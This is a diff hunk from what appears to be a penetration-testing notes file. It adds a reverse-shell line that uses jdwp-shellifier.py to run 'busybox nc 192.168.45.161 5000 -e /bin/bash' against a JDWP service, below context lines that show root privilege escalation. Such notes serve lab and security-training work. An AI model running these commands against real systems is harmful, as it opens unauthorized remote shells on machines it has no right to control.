@@ -2564,6 +2564,8 @@ nc 127.0.0.1 5000 -z
 /bin/bash -p
 id
 # euid=0 (root)
+#For reverse shell
+python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.161 5000 -e /bin/bash"
 ```
 
 # Resources
